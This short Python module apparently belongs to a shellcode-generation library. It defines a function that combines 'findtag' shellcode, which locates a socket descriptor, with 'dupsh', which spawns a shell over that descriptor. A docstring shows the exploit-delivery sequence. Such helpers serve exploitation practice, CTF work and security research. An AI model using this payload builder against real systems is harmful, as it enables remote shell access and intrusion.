from . import *

def findtagsh(tag):
    """Args: Tag to look for

    Finds the current file descriptor using the findtag
    shellcode, and then runs a dupsh.
    
    Common use case:

    sock.send_exploit()
    sock.send(findtagsh(TAG))
    time.sleep(0.1)
    sock.send(TAG)
    sock.interactive()"""
    return findtag(tag) + dupsh("ebp")
